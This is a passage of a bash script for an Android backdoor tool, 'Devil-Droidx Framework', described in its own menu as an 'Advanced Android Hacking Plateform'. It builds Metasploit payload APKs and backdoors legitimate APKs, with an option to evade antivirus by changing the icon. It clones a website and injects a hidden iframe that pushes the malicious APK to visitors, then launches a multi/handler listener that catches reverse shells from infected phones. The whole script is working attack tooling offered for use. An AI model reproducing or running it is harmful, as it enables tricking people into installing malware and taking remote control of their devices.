 echo "[*] Aligning recompiled APK..."
 spinlong
 zipalign 4 evil.apk $apk_name.apk 2>&1
 rc=$?
 echo -e $yellow
 echo "[✔] Done."
 spinlong
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] Failed to align recompiled APK"
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
 rm evil.apk > /dev/null 2>&1
}
#function ask
function quests()
{
while true; do
   echo ""
   quest=$(zenity --list --title "☢ DEVIL-DROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
   case $quest in
   APK-MSF) change_icon;spinlong;gen_payload;spinlong;apk_decomp;flagg;merge_name_ico;spinlong;apk_comp;spinlong;sign;return;;
   ORIGINAL-APK) orig_apk;spinlong;gen_payload;spinlong;up_apktook;apk_decomp1;spinlong;apk_decomp;flagg_original;spinlong;apk_comp1;spinlong;sign;return;;
   esac
done
}
#function listeners
function listener()
{
  xterm -T "DEVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
}
#function clone site
function clns()
{
 clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "PASTE LINK WEBSITE TO CLONE" --entry --width 400 2> /dev/null)
}
function index_name()
{
 index=$(zenity --title "☢ INDEX NAME ☢" --text "example: wtf.html" --entry --entry-text "wtf" --width 300 2> /dev/null)
 echo -e $yellow ""
 echo "[*] Clone Website From URL..."
 spinlong
 wget $clone --no-check-certificate -O $index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1
}
function launcher()
{
 echo '<iframe id="frame" src="evil.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe><script type="text/javascript">setTimeout(function(){window.location.href="http://local-ip";}, 15000);</script></body></html>' | sed "s|evil.apk|$apk_name.apk|" | sed "s|local-ip|$LHOST/$index.html|" >> apk_index
 com=`cat apk_index`
 rep="</body></html>"
 sed "s|$rep|$com|" $index.html > index2.html
 mv index2.html /var/www/html/$index.html > /dev/null 2>&1
 cp $path/devilapk/$apk_name.apk /var/www/html > /dev/null 2>&1
 rm apk_index > /dev/null 2>&1
 rm $index.html > /dev/null 2>&1
 zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
}
#function attack verctor
function atkv()
{
while true; do
   echo ""
   atk_v=$(zenity --list --title "☢ DEVIL-DROID OPTIONS ☢" --text "Choose an option bellow:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
   case $atk_v in
   Multi-Handler) listener;suite;;
   Attack-Vector) clns;spinlong;index_name;launcher;listener;suite;;
   Main-Menu) clear;main;;
   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
   esac
done
}
#function suite
function suite()
{
while true; do
   echo ""
   suit=$(zenity --list --title "☢ DEVIL-DROID OPTIONS ☢" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
   case $suit in
   Main-Menu) clear;main;;
   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
   esac
done
}
#function clean files
function clean()
{
 rm $directory/* > /dev/null 2>&1
 rm $path/*.jpeg > /dev/null 2>&1
 rm $path/*.txt > /dev/null 2>&1
 rm /var/www/html/*.apk > /dev/null 2>&1
 rm /var/www/html/$index.html > /dev/null 2>&1
}      
start=$(zenity --question --title="☢ Devil-Droidx Framework ☢" --text "Execute framework and Services?" --width 270 2> /dev/null)
  if [ "$?" -eq "0" ]; then
    apache_svc_start
    postgresql_start
  else
    clear
    echo ""
    echo -e $lightgreen "╔─────────────────────────────────────────╗"
    echo -e $lightgreen "|           Author: Prashant Joshi        |"
    echo -e $lightgreen "|    Devil-Droidx Framework version 2.ps  |"
    echo -e $lightgreen "|           IamPrashu-labs.in             |"
    echo -e $lightgreen "|   Credits to : Neha Kandpal , Peater J  |"
    echo -e $lightgreen "|               , tejix .kil              |"
    echo -e $lightgreen "|              and Johan Jack             |"
    echo -e $lightgreen "┖─────────────────────────────────────────┙"
    echo ""
    apache_svc_stop
    postgresql_stop
    exit
  fi
clear
#main menu
function main()
{
    while :
    do

        print_ascii_art
        echo -e $green ""
        echo "╔──────────────────────────────────────────────╗"
        echo "|    Devil-Droidx Framework version 2.ps       |"
        echo "|      Advanced Android Hacking Plateform      |"
        echo "┖──────────────────────────────────────────────┙"
        echo "[1] APK MSF                                     "
        echo "[2] BACKDOOR APK ORIGINAL (OLD)                 "
        echo "[3] BACKDOOR APK ORIGINAL (NEW)                 "
        echo "[4] BYPASS AV APK (ICON CHANGE)                 "
        echo "[5] START LISTENER                              "
        echo "[c] CLEAN                                       "
        echo "[q] QUIT                                        "
        read -p "[?] Select>: " option
        echo
        
        case "$option" in 
            1)  echo -e $lightgreen "[✔] APK MSF"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                spinlong
                gen_payload
                mv $apk_name.apk $path/devilapk > /dev/null 2>&1
                error0
                sleep 2
                echo ""
                zenity --title "☢ DEVIL-DROID ☢" --info --text "APK PAYLOAD : $path/devilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv
                echo
                ;;
            2)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL (OLD)"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                orig_apk
                echo
                spinlong
                up_apktook
                embed_payload
                echo 
                mv $apk_name.apk $path/devilapk > /dev/null 2>&1
                error
                sleep 2
                echo ""
                zenity --title "☢ DEVIL-DROID ☢" --info --text "BACKDOORED APK : $path/devilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv 
                echo
                ;;
            3)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL (NEW)"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                orig_apk
                echo
                spinlong
                gen_payload
                up_apktook
                apk_decomp1
                apk_decomp
                perms
                hook_smalies
                spinlong
                apk_comp1
                sign
                echo 
                mv $apk_name.apk $path/devilapk > /dev/null 2>&1
                error
                sleep 2
                echo ""
                zenity --title "☢ DEVIL-DROID ☢" --info --text "BACKDOORED APK : $path/devilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv 
                echo
                ;;
            4)  echo -e $lightgreen "[✔] BYPASS AV APK"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload1
                echo
                quests
                mv $apk_name.apk $path/devilapk > /dev/null 2>&1
                error
                sleep 2
                echo 
                zenity --title "☢ DEVIL-DROID ☢" --info --text "APK SIGNED : $path/devilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv 
                echo
                ;;
            5)  echo -e $lightgreen "[✔] START LISTENER"
                echo -e $green
                get_lhost
                get_lport
                echo
                get_payload
                echo
                listener
                suite 
                echo
                ;;
            c)  echo -e $lightgreen "[✔] clean up all files"
                echo
                clean
                echo
                zenity --title "☢ DEVIL-DROID ☢" --info --text "All Files Are Removed " --width 400 > /dev/null 2>&1
                echo
                clear
                ;;
            q)  echo -e $yellow " See You Than."
                apache_svc_stop
                postgresql_stop
                echo
                exit 0 
                ;;
            *)  echo -e $red  "【X】 Invalid option, please write a valid number【X】"
                echo
                sleep 2
                ;;
        esac
    done
}
main